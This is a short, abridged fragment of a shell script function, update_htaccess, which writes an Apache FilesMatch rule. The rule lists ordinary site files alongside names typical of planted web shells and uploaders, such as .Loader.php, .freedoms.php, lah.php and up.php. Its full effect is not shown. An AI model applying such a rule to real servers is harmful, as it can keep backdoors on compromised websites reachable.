...
update_htaccess() {
  ...
  
  {
    ...
    echo "</FilesMatch>"
    echo
    echo "<FilesMatch \"^(index.html|index.php|class.php|class-index.php|config.php|login.php|.Loader.php|.user4-128x128.php|print_staff.php|print_laporan.php|lah.php|.Loader.php|.freedoms.php|sas.php|minfo.php|12-MAR.ShTmL|up.php)\$\">"
